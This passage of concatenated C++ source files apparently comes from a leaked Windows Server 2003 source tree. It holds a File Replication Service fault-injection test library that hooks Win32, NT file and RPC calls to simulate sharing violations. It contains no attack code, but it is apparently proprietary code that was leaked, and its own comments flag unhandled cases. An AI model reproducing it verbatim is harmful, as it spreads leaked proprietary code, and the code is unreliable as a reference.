    FF_ASSERT(ObjectAttributes->ObjectName);

    if (IS_VALID_HANDLE(Handle)) {

        PWCHAR RootName;

        if (FfSvLookupNtHandleName(Handle, &RootName)) {

            //
            // Build up a name from the root name and the relative name
            //

            SIZE_T RootNameLength = wcslen(RootName);

            PWCHAR Name = reinterpret_cast<PWCHAR>(
                FfAlloc(RootNameLength * sizeof(WCHAR) +
                        ObjectAttributes->ObjectName->Length + sizeof(WCHAR))
                );

            wcscpy(Name, RootName);
            CopyMemory(Name + RootNameLength,
                       ObjectAttributes->ObjectName->Buffer,
                       ObjectAttributes->ObjectName->Length);
            Name[RootNameLength +
                 ObjectAttributes->ObjectName->Length / 2] = UNICODE_NULL;

            *FullName = Name;
            return TRUE;

        } else {

            //
            // We do not know the handle, so just output some
            // diagnostic information
            //

            FF_TRACE(MiFF_WARNING,
                     "Do not know handle: 0x%08X -- investigating...",
                     Handle);

            PWCHAR MostlyFullName;

            NTSTATUS Status = FfGetMostlyFullPathByHandle(
                Handle,
                NULL,
                &MostlyFullName
                );

            if (MostlyFullName) {
                FF_TRACE(MiFF_INFO,
                         "Mostly full name for 0x%08X is \"%S\"",
                         Handle, MostlyFullName);
                FfFree(MostlyFullName);
            } else {
                FF_TRACE(MiFF_INFO,
                         "Cannot get mostly full handle info for 0x%08X "
                         "(NT Status = 0x%08X)",
                         Handle, Status);
            }

            return FALSE;

        }

    } else {

        //
        // We do not have a root handle, so the name is just from the
        // object attributes
        //

        PWCHAR Name = reinterpret_cast<PWCHAR>(
            FfAlloc(ObjectAttributes->ObjectName->Length + sizeof(WCHAR))
            );

        CopyMemory(Name,
                   ObjectAttributes->ObjectName->Buffer,
                   ObjectAttributes->ObjectName->Length);
        Name[ObjectAttributes->ObjectName->Length / 2] = UNICODE_NULL;

        *FullName = Name;
        return TRUE;
    }

}


int
__stdcall
FF_DeleteFileW_G_SharingViolation(
    unsigned short const* lpFileName
    )
{
    FF_TRACE(MiFF_INFO, "DeleteFileW(%S)", lpFileName);

    DWORD Error;
    BOOL Intercept;

    Intercept = FfShouldInterceptPathName(
        lpFileName,
        DELETE,
        FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
        FALSE,
        FALSE,
        OUT Error
        );

    if (Intercept) {
        SetLastError(Error);
        return FALSE;
    }

    typedef int (__stdcall *FP)(unsigned short const*);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpFileName);
}


int
__stdcall
FF_MoveFileExW_G_SharingViolation(
    unsigned short const* lpExistingFileName,
    unsigned short const* lpNewFileName,
    unsigned long dwFlags
    )
{
    FF_TRACE(MiFF_INFO, "MoveFileExW(%S, %S, 0x%08X)", lpExistingFileName,
             lpNewFileName, dwFlags);

    if (!(dwFlags & MOVEFILE_DELAY_UNTIL_REBOOT)) {
        DWORD Error;
        BOOL Intercept;

        Intercept = FfShouldInterceptPathName(
            lpExistingFileName,
            DELETE | SYNCHRONIZE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FALSE,
            FALSE,
            OUT Error
            );

        if (Intercept) {
            SetLastError(Error);
            return FALSE;
        }

        if (lpNewFileName != NULL) {

            Intercept = FfShouldInterceptPathName(
                lpNewFileName,
                0,
                0,
                TRUE,
                FALSE,
                OUT Error
                );

            if (Intercept) {
                SetLastError(Error);
                return FALSE;
            }

        }
    }

    typedef int (__stdcall *FP)(unsigned short const*,unsigned short const*,unsigned long);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpExistingFileName, lpNewFileName, dwFlags);
}


int
__stdcall
FF_CopyFileExW_G_SharingViolation(
    unsigned short const* lpExistingFileName,
    unsigned short const* lpNewFileName,
    void* lpProgressRoutine,
    void* lpData,int* pbCancel,
    unsigned long dwCopyFlags
    )
{
    FF_TRACE(MiFF_INFO, "CopyFileExW(%S, %S, ..., 0x%08X)", lpExistingFileName,
             lpNewFileName, dwCopyFlags);

    // ISSUE-2002/08/05-daniloa -- Access/Share is not correct for all cases
    // The CopyFileEx codepath is very complex...
    DWORD Error;
    BOOL Intercept;

    Intercept = FfShouldInterceptPathName(
        lpExistingFileName,
        GENERIC_READ,
        FILE_SHARE_READ,
        FALSE,
        FALSE,
        OUT Error
        );

    if (Intercept) {
        return Error;
    }

    Intercept = FfShouldInterceptPathName(
        lpNewFileName,
        SYNCHRONIZE | FILE_READ_ATTRIBUTES | GENERIC_WRITE | DELETE,
        0,
        FALSE,
        FALSE,
        OUT Error
        );

    if (Intercept) {
        return Error;
    }

    typedef int (__stdcall *FP)(unsigned short const*,unsigned short const*,void*,void*,int*,unsigned long);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpExistingFileName, lpNewFileName, lpProgressRoutine, lpData, pbCancel, dwCopyFlags);
}


void*
__stdcall
FF_CreateFileW_G_SharingViolation(
    unsigned short const* lpFileName,
    unsigned long dwDesiredAccess,
    unsigned long dwShareMode,
    _SECURITY_ATTRIBUTES* lpSecurityAttributes,
    unsigned long dwCreationDisposition,
    unsigned long dwFlagsAndAttributes,
    void* hTemplateFile
    )
{
    FF_TRACE(MiFF_INFO, "CreateFileW(%S, 0x%08X, 0x%08X, 0x%08X, 0x%08X)",
             lpFileName, dwDesiredAccess, dwShareMode, dwCreationDisposition,
             dwFlagsAndAttributes);

    // NOTICE-2002/08/05-daniloa -- Potential race condition
    // It may be the case that the file is created before we call
    // through to CreateFile.  In that case, we may fail to intercept.
    if (dwCreationDisposition != CREATE_NEW) {

        DWORD Error;
        BOOL Intercept;

        Intercept = FfShouldInterceptPathName(
            lpFileName,
            dwDesiredAccess,
            dwShareMode,
            FALSE,
            FALSE,
            OUT Error
            );

        if (Intercept) {
            SetLastError(Error);
            return INVALID_HANDLE_VALUE;
        }

    }

    typedef void* (__stdcall *FP)(unsigned short const*,unsigned long,unsigned long,_SECURITY_ATTRIBUTES*,unsigned long,unsigned long,void*);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    void* Result = pfn(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    FF_TRACE(MiFF_INFO, "Result = 0x%08X", Result);
    return Result;
}


unsigned long
__stdcall
FF_OpenEncryptedFileRawW_G_SharingViolation(
    unsigned short const* lpFileName,
    unsigned long Flags,
    void** Context
    )
{
    FF_TRACE(MiFF_INFO, "OpenEncryptedFileRawW(%S, 0x%08X, ...)",
             lpFileName, Flags);

    ACCESS_MASK FileAccess = 0;

    // See EfsOpenFileRaw in nt\ds\security\base\lsa\server\efsapi.cxx
    // for how FileAccess is set.

    if ( Flags & CREATE_FOR_IMPORT ){

        //
        // Prepare parameters for create of import
        //

        FileAccess = FILE_WRITE_ATTRIBUTES;

        if ( Flags & CREATE_FOR_DIR ){

            //
            // Import a directory
            //

            FileAccess |= FILE_WRITE_DATA | FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE;

        } else {

            //
            // Import file
            // Should we use FILE_SUPERSEDE here?
            //

            FileAccess |= SYNCHRONIZE;

        }


    } else {

        //
        // If export is requested and the file is not encrypted,
        // Fail the call.
        //

        FileAccess = FILE_READ_ATTRIBUTES;

        //
        // Prepare parameters for create of export
        //

        if ( Flags & CREATE_FOR_DIR ){

            //
            // Export a directory
            //

            FileAccess |= FILE_READ_DATA;

        } else {
            FileAccess |= SYNCHRONIZE;
        }

    }

    // ISSUE-2002/08/05-daniloa -- Code here is not generic, but OK for FRS
    // Since FRS is running as system w/o impersonation when using
    // this API, we set Privilege accordingly (see EfsOpenFileRaw).
    // Ideally, we should try to mess with the thread token privs and then
    // restore them.
    BOOL Privilege = TRUE;

    if ( !Privilege ){

        //
        // Not a backup operator
        //
        if ( !(Flags & CREATE_FOR_IMPORT) ){

            FileAccess |= FILE_READ_DATA;

        } else {

            FileAccess |= FILE_WRITE_DATA;

        }
    } else {

        //
        //  A backup operator or the user with the privilege
        //

        if ( !(Flags & CREATE_FOR_DIR) ){

            FileAccess |= DELETE;

        }

    }

    DWORD Error;
    BOOL Intercept;

    Intercept = FfShouldInterceptPathName(
        lpFileName,
        FileAccess,
        0,
        FALSE,
        FALSE,
        OUT Error
        );

    if (Intercept) {
        return Error;
    }

    typedef unsigned long (__stdcall *FP)(unsigned short const*,unsigned long,void**);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpFileName, Flags, Context);
}


// typedef struct _OBJECT_ATTRIBUTES {
//     ULONG Length;
//     HANDLE RootDirectory;
//     PUNICODE_STRING ObjectName;
//     ULONG Attributes;
//     PVOID SecurityDescriptor;
//     PVOID SecurityQualityOfService;
// } OBJECT_ATTRIBUTES;

// typedef struct _FILE_NAME_INFORMATION {                     // ntddk
//     ULONG FileNameLength;                                   // ntddk
//     WCHAR FileName[1];                                      // ntddk
// } FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;           // ntddk

// typedef struct _FILE_RENAME_INFORMATION {
//     BOOLEAN ReplaceIfExists;
//     HANDLE RootDirectory;
//     ULONG FileNameLength;
//     WCHAR FileName[1];
// } FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

// typedef struct _FILE_DISPOSITION_INFORMATION {                  // ntddk nthal
//     BOOLEAN DeleteFile;                                         // ntddk nthal
// } FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION; // ntddk nthal


PWCHAR
GetFileInformationClassString(
    IN FILE_INFORMATION_CLASS FileInformationClass
    )
{
#define CASE(x) case x: return L#x
    switch (FileInformationClass) {
        CASE(FileDirectoryInformation);
        CASE(FileFullDirectoryInformation);
        CASE(FileBothDirectoryInformation);
        CASE(FileBasicInformation);
        CASE(FileStandardInformation);
        CASE(FileInternalInformation);
        CASE(FileEaInformation);
        CASE(FileAccessInformation);
        CASE(FileNameInformation);
        CASE(FileRenameInformation);
        CASE(FileLinkInformation);
        CASE(FileNamesInformation);
        CASE(FileDispositionInformation);
        CASE(FilePositionInformation);
        CASE(FileFullEaInformation);
        CASE(FileModeInformation);
        CASE(FileAlignmentInformation);
        CASE(FileAllInformation);
        CASE(FileAllocationInformation);
        CASE(FileEndOfFileInformation);
        CASE(FileAlternateNameInformation);
        CASE(FileStreamInformation);
        CASE(FilePipeInformation);
        CASE(FilePipeLocalInformation);
        CASE(FilePipeRemoteInformation);
        CASE(FileMailslotQueryInformation);
        CASE(FileMailslotSetInformation);
        CASE(FileCompressionInformation);
        CASE(FileObjectIdInformation);
        CASE(FileCompletionInformation);
        CASE(FileMoveClusterInformation);
        CASE(FileQuotaInformation);
        CASE(FileReparsePointInformation);
        CASE(FileNetworkOpenInformation);
        CASE(FileAttributeTagInformation);
        CASE(FileTrackingInformation);
        CASE(FileIdBothDirectoryInformation);
        CASE(FileIdFullDirectoryInformation);
        CASE(FileValidDataLengthInformation);
        CASE(FileShortNameInformation);
    default:
        return NULL;
    }
}


NTSTATUS
NTAPI
FF_NtSetInformationFile_G_SharingViolation(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    )
{
    NTSTATUS Status;
    PWCHAR FileInformationType;
    PWCHAR SourceName = NULL;

    FileInformationType = GetFileInformationClassString(FileInformationClass);

    if (IS_VALID_HANDLE(FileHandle)) {
        FfSvLookupNtHandleName(FileHandle, &SourceName);
    }

    if (FileInformationType) {
        FF_TRACE(MiFF_INFO,
                 "NtSetInformationFile(0x%08X = \"%S\", %S)",
                 FileHandle,
                 SourceName ? SourceName : L"(null)",
                 FileInformationType);
    } else {
        FF_TRACE(MiFF_INFO,
                 "NtSetInformationFile(0x%08X = \"%S\", "
                 "Unknown FileInformationClass = 0x%08X)",
                 FileHandle,
                 SourceName ? SourceName : L"(null)",
                 FileInformationClass);
    }

    if (SourceName) {
        FfFree(SourceName);
        SourceName = NULL;
    }

    //
    // Any operation on the open FileHandle is ok because the handle
    // is already open.  The OS will do further checks.  What we need
    // to check is the target of the operation.  This applies to
    // rename (and probably some others).
    //

    if (IS_VALID_HANDLE(FileHandle) &&
        (FileInformationClass == FileRenameInformation)) {

        PWCHAR FullName;

        OBJECT_ATTRIBUTES ObjectAttributes;
        UNICODE_STRING NewFileName;

        PFILE_RENAME_INFORMATION RenameBuffer =
            reinterpret_cast<PFILE_RENAME_INFORMATION>(FileInformation);

        NewFileName.Length = (USHORT) RenameBuffer->FileNameLength;
        NewFileName.MaximumLength = (USHORT) RenameBuffer->FileNameLength;
        NewFileName.Buffer = RenameBuffer->FileName;

        InitializeObjectAttributes(&ObjectAttributes,
                                   &NewFileName,
                                   0,
                                   RenameBuffer->RootDirectory,
                                   NULL);

        FfSvGetFullNameFromObjectAttributes(&ObjectAttributes, &FullName);

        if (FullName) {

            DWORD Error;
            BOOL Intercept;

            // ISSUE-2002/08/07-daniloa -- Also FILE_ADD_SUBDIRECTORY if src is dir
            Intercept = FfShouldInterceptPathName(
                FullName,
                FILE_WRITE_DATA | SYNCHRONIZE,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                FALSE,
                TRUE,
                OUT Error
                );

            FfFree(FullName);

            if (Intercept) {
                if (!IoStatusBlock) {
                    Error = STATUS_INVALID_PARAMETER;
                } else {
                    IoStatusBlock->Status = Error;
                    IoStatusBlock->Information = 0;
                }
                return Error;
            }
        }
    }

    typedef NTSTATUS (NTAPI *FP)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass);
}


NTSTATUS
NTAPI
FF_NtCreateFile_G_SharingViolation(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength
    )
{
    NTSTATUS Status;
    PWCHAR FullName = NULL;
    BOOL IsById = (CreateOptions & FILE_OPEN_BY_FILE_ID) ? TRUE : FALSE;

    // ISSUE-2002/08/07-daniloa -- need to handle FILE_OPEN_BY_FILE_ID
    if (IsById) {
        // try to open the file for no access and share all
        // do an NtQueryInfomatonfile to get the name...
        // slap it together with the RootDirectory
    } else {
        FfSvGetFullNameFromObjectAttributes(ObjectAttributes, &FullName);
    }

    FF_TRACE(MiFF_INFO,
             "NtCreateFile(0x%08X, (0x%08X, %.*S) => \"%S\", 0x%08X, 0x%08X, 0x%08X, 0x%08X, 0x%08X)",
             DesiredAccess,
             ObjectAttributes->RootDirectory,
             IsById ? 7 : ObjectAttributes->ObjectName->Length / sizeof(WCHAR),
             IsById ? L"{BY_ID}" : ObjectAttributes->ObjectName->Buffer,
             FullName ? FullName : L"(null)",
             ObjectAttributes->Attributes,
             FileAttributes,
             ShareAccess,
             CreateDisposition,
             CreateOptions
             );

    if (FullName && (CreateDisposition != FILE_CREATE)) {

        DWORD Error;
        BOOL Intercept;

        Intercept = FfShouldInterceptPathName(
            FullName,
            DesiredAccess,
            ShareAccess,
            FALSE,
            TRUE,
            OUT Error
            );

        if (Intercept) {
            if (!FileHandle) {
                Error = STATUS_INVALID_PARAMETER;
            } else {
                *FileHandle = INVALID_HANDLE_VALUE;
            }
            if (!IoStatusBlock) {
                Error = STATUS_INVALID_PARAMETER;
            } else {
                IoStatusBlock->Status = Error;
                IoStatusBlock->Information = 0;
            }
            Status = Error;
            goto cleanup;
        }
    }

    typedef NTSTATUS (NTAPI *FP)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");

    Status = pfn(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);

 cleanup:
    FF_TRACE(MiFF_DEBUG, "Status = 0x%08X", Status);

    if (FullName) {

        if (NT_SUCCESS(Status) &&
            FileHandle &&
            IS_VALID_HANDLE(*FileHandle)) {

            //
            // Add handle to handle table
            //

            FF_TRACE(MiFF_DEBUG, "TRY: "
                     "Store Handle 0x%08X = \"%S\"", *FileHandle, FullName);

            FfSvStoreNtHandleName(
                *FileHandle,
                FullName
                );

        }
        FfFree(FullName);
    }

    if (NT_SUCCESS(Status)) {
        FF_TRACE(MiFF_INFO, "Returning Handle = 0x%08X", *FileHandle);
    }

    return Status;
}


NTSTATUS
NTAPI
FF_NtOpenFile_G_SharingViolation(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions
    )
{
    NTSTATUS Status;
    PWCHAR FullName = NULL;
    BOOL IsById = (OpenOptions & FILE_OPEN_BY_FILE_ID) ? TRUE : FALSE;

    // ISSUE-2002/08/07-daniloa -- need to handle FILE_OPEN_BY_FILE_ID
    if (IsById) {
        // try to open the file for no access and share all
        // do an NtQueryInfomatonfile to get the name...
        // slap it together with the RootDirectory
    } else {
        FfSvGetFullNameFromObjectAttributes(ObjectAttributes, &FullName);
    }

    FF_TRACE(MiFF_INFO,
             "NtOpenFile(0x%08X, (0x%08X, %.*S) => \"%S\", 0x%08X, 0x%08X, 0x%08X)",
             DesiredAccess,
             ObjectAttributes->RootDirectory,
             ObjectAttributes->ObjectName->Length / sizeof(WCHAR),
             ObjectAttributes->ObjectName->Buffer,
             FullName ? FullName : L"(null)",
             ObjectAttributes->Attributes,
             ShareAccess,
             OpenOptions
             );

    if (FullName) {

        DWORD Error;
        BOOL Intercept;

        // ISSUE-2002/07/26-daniloa -- Need to use the root handle
        Intercept = FfShouldInterceptPathName(
            FullName,
            DesiredAccess,
            ShareAccess,
            FALSE,
            TRUE,
            OUT Error
            );

        if (Intercept) {
            if (!FileHandle) {
                Error = STATUS_INVALID_PARAMETER;
            } else {
                *FileHandle = INVALID_HANDLE_VALUE;
            }
            if (!IoStatusBlock) {
                Error = STATUS_INVALID_PARAMETER;
            } else {
                IoStatusBlock->Status = Error;
                IoStatusBlock->Information = 0;
            }
            Status = Error;
            goto cleanup;
        }
    }

    typedef NTSTATUS (NTAPI *FP)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    Status = pfn(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

 cleanup:
    FF_TRACE(MiFF_DEBUG, "Status = 0x%08X", Status);

    if (FullName) {

        if (NT_SUCCESS(Status) &&
            FileHandle &&
            IS_VALID_HANDLE(*FileHandle)) {

            //
            // Add handle to handle table
            //

            FF_TRACE(MiFF_DEBUG, "TRY: "
                     "Store Handle 0x%08X = \"%S\"", *FileHandle, FullName);

            FfSvStoreNtHandleName(
                *FileHandle,
                FullName
                );

        }
        FfFree(FullName);
    }

    if (NT_SUCCESS(Status)) {
        FF_TRACE(MiFF_INFO, "Returning Handle = 0x%08X", *FileHandle);
    }

    return Status;
}


NTSTATUS
NTAPI
FF_NtClose_G_SharingViolation(
    IN HANDLE Handle
    )
{
    // ISSUE-2002/08/07-daniloa -- Assumes NtClose will succeed
    if (FfSvRemoveNtHandleName(Handle)) {
        FF_TRACE(MiFF_DEBUG, "Removed handle 0x%08X", Handle);
    }

    typedef NTSTATUS (NTAPI *FP)(HANDLE);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(Handle);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\frs\fault\rpc.cxx ===
#include "pch.hxx"


inline
void
CLEANUP_RPC_STRING(
    unsigned short*& s
    )
{
    if (s)
        RpcStringFreeW(&s);
    s = 0;
}


void
DumpBindingInfo(
    unsigned short* StringBinding
    )
{
    RPC_STATUS status = 0;
    unsigned short* ObjectUuid = 0;
    unsigned short* ProtSeq = 0;
    unsigned short* NetworkAddr = 0;
    unsigned short* EndPoint = 0;
    unsigned short* NetworkOptions = 0;
    
    FF_TRACE(MiFF_INFO, "StringBinding = %S", StringBinding);

    status = RpcStringBindingParseW(StringBinding,
                                    &ObjectUuid,
                                    &ProtSeq,
                                    &NetworkAddr,
                                    &EndPoint,
                                    &NetworkOptions);
    if (status) {
        FF_TRACE(MiFF_INFO, "RpcStringBindingParse() error: %u", status);
        goto cleanup;
    }

    FF_TRACE(MiFF_INFO,
             "ObjectUuid = %S\n"
             "ProtSeq = %S\n"
             "NetworkAddr = %S\n"
             "EndPoint = %S\n"
             "NetworkOptions = %S\n",
             ObjectUuid,
             ProtSeq,
             NetworkAddr,
             EndPoint,
             NetworkOptions);

 cleanup:
    CLEANUP_RPC_STRING(ObjectUuid);
    CLEANUP_RPC_STRING(ProtSeq);
    CLEANUP_RPC_STRING(NetworkAddr);
    CLEANUP_RPC_STRING(EndPoint);
    CLEANUP_RPC_STRING(NetworkOptions);
}


void
DumpBindingInfo(
    void* Handle
    )
{
    RPC_STATUS status = 0;
    unsigned short* StringBinding = 0;

    status = RpcBindingToStringBindingW(Handle, &StringBinding);
    if (status) {
        FF_TRACE(MiFF_INFO, "RpcBindingToStringBinding() error: %u", status);
    } else {
        DumpBindingInfo(StringBinding);
    }

    CLEANUP_RPC_STRING(StringBinding);
}


struct ARGS_G_FailRpcsToMachine
{
    typedef ARGS_G_FailRpcsToMachine self_t;

    // NOTICE-2002/07/16-daniloa -- Need hash_map, but that's in 7.0 STL
    // The STL currently in the Windows build is the VC 6.0 STL.
    // That will be remedied after .NET Server.
    map<string, bool> computer;

    static self_t* Get(I_Lib* pLib)
    {
        I_Args* pArgs = pLib->GetTrigger()->GetGroupArgs();
        self_t* pParsedArgs = reinterpret_cast<self_t*>(pArgs->GetParsedArgs());
        if (!pParsedArgs)
        {
            const size_t count = pArgs->GetCount();
            FF_ASSERT(count == 1);

            pParsedArgs = new self_t;

            for (size_t i = 0; i < count; i++)
            {
                Arg arg = pArgs->GetArg(i);
                FF_ASSERT(pParsedArgs->computer.find(arg.Value) ==
                          pParsedArgs->computer.end());
                pParsedArgs->computer[arg.Value] = true;
            }
            if (!pArgs->SetParsedArgs(pParsedArgs, Cleanup))
            {
                // someone else set the args while we were building the args
                delete pParsedArgs;
                pParsedArgs = reinterpret_cast<self_t*>(pArgs->GetParsedArgs());
                FF_ASSERT(pParsedArgs);
            }
        }
        return pParsedArgs;
    };
    static void Cleanup(void* _p)
    {
        self_t* pParsedArgs = reinterpret_cast<self_t*>(_p);
        delete pParsedArgs;
    };
};


long
__stdcall
FF_RpcBindingFromStringBindingW_G_FailRpcsToMachine(
    unsigned short* StringBinding,
    void** Binding
    )
{
    typedef ARGS_G_FailRpcsToMachine g_args_t;
    g_args_t* pGroupArgs = g_args_t::Get(g_pLib);

    DumpBindingInfo(StringBinding);

    typedef long (__stdcall *FP)(unsigned short*, void**);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(StringBinding, Binding);
}


unsigned long
__stdcall
FF_FrsRpcSendCommPkt_G_FailRpcsToMachine(
    void* Handle,
    _COMM_PACKET* CommPkt
    )
{
    typedef ARGS_G_FailRpcsToMachine g_args_t;
    g_args_t* pGroupArgs = g_args_t::Get(g_pLib);

    DumpBindingInfo(Handle);

    typedef unsigned long (__stdcall *FP)(void*,_COMM_PACKET*);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(Handle, CommPkt);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\frs\fault\util.h ===
#pragma once


#define IS_VALID_HANDLE(h) (h && (h != INVALID_HANDLE_VALUE))


typedef struct _FF_SHARE_ACCESS {
    ULONG OpenCount;
    ULONG Readers;
    ULONG Writers;
    ULONG Deleters;
    ULONG SharedRead;
    ULONG SharedWrite;
    ULONG SharedDelete;
} FF_SHARE_ACCESS, *PFF_SHARE_ACCESS;


typedef struct _FF_MATCH_INFO {
    PWCHAR Win32NtPath;
    PWCHAR FilePart;
    BOOL IsDir;
    FF_SHARE_ACCESS ShareAccess;
} FF_MATCH_INFO, *PFF_MATCH_INFO;


#define CANONICALIZE_PATH_NAME_WIN32_NT   1
#define CANONICALIZE_PATH_NAME_VALID_MASK 1


#ifdef __cplusplus
extern "C" {
#endif
#if 0
}
#endif

PVOID
FfAlloc(
    SIZE_T Size
    );

BOOL
FfFree(
    PVOID Buffer
    );

PWCHAR
FfWcsDup(
    PWCHAR OldStr
    );

NTSTATUS
FfGetMostlyFullPathByHandle(
    IN HANDLE   Handle,
    IN PWCHAR   FakeName OPTIONAL,
    OUT PWCHAR* MostlyFullName
    );

BOOL
FfIsDeviceName(
    IN PWCHAR PathName
    );

BOOL
FfIsEscapedWin32PathName(
    IN PWCHAR PathName
    );

BOOL
FfCanonicalizeWin32PathName(
    IN PWCHAR PathName,
    IN DWORD Flags,
    OUT PWCHAR* CanonicalizedName,
    OUT PWCHAR* FinalPart OPTIONAL
    );

BOOL
FfCanonicalizeNtPathNameToWin32PathName(
    IN PWCHAR PathName,
    OUT PWCHAR* CanonicalizedName,
    OUT PWCHAR* FinalPart OPTIONAL
    );

BOOL
FfWin32PathNameExists(
    IN PWCHAR PathName,
    OUT BOOL* IsDirectory OPTIONAL
    );

DWORD
FfCheckShareAccess(
    IN ACCESS_MASK DesiredAccess,
    IN ULONG DesiredShareAccess,
    IN OUT FF_SHARE_ACCESS* ShareAccess,
    IN BOOL Update
    );

BOOL
GetAccessFromString(
    IN TCHAR* AccessString,
    OUT DWORD& Access
    );

BOOL
GetSharingFromString(
    IN TCHAR* SharingString,
    OUT DWORD& Sharing
    );

BOOL
GetTypeFromString(
    IN TCHAR* TypeString,
    OUT BOOL& IsDir
    );

#if 0
{
#endif
#ifdef __cplusplus
}
#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\hello\src\hello.h ===
#pragma once

HANDLE
OpenFileForReadW(
    PWCHAR pszFileName
    );
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\hello\fault\hello_fault.cxx ===
#include <stdio.h>
#include <InjRT.h>
#include <stdlib.h>
#include <windows.h>
#include <assert.h>

void __stdcall FaultLib_Global_P1(
        int i)
{
    FP_Original_P1
        pfnOriginal_P1 = pointer_reinterpret_cast<FP_Original_P1>(
            CInjectorRT::GetOrigFunctionAddress());

    FP_Original_P2
        pfnOriginal_P2 = pointer_reinterpret_cast<FP_Original_P2>(
            CInjectorRT::GetOrigFunctionAddress());

    printf("START P1\n");
    pfnOriginal_P1(i);
    pfnOriginal_P2(i);
    printf("END P1\n");

}

void __stdcall FaultLib_Global_P2(
        int i)
{
}

void __stdcall FaultLib_Global_P3(
        int i)
{
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\util\util.c ===
#include <windows.h>
#include <stdio.h>
#include <malloc.h>
#include "util.h"

BOOL
IsSeparator(
    IN WCHAR ch
    )
{
    return (ch == L'/' || ch == L'\\') ? TRUE : FALSE;
}

BOOL
IsUNC(
    IN PWCHAR pszPath
    )
{
    return (pszPath && pszPath[0] && pszPath[1] && IsSeparator(pszPath[0]) && IsSeparator(pszPath[1])) ? TRUE : FALSE;
}

BOOL
IsRoot(
    IN PWCHAR pszPath
    )
{
    return (pszPath && pszPath[0] && IsSeparator(pszPath[0]) && !IsUNC(pszPath)) ? TRUE : FALSE;
}

BOOL
IsDrive(
    IN PWCHAR pszPath
    )
{
    return (pszPath && pszPath[0] && pszPath[1] && IsCharAlphaW(pszPath[0]) && pszPath[1] == L':') ? TRUE : FALSE;
}

BOOL
CanonicalizePathName(
    IN PWCHAR pszPathName,
    OUT PWCHAR* pszCanonicalizedName
    )
{
    PWCHAR pszFull = NULL;
    DWORD cchFull;
    DWORD cchFullNew;
    PWCHAR pszFinal;

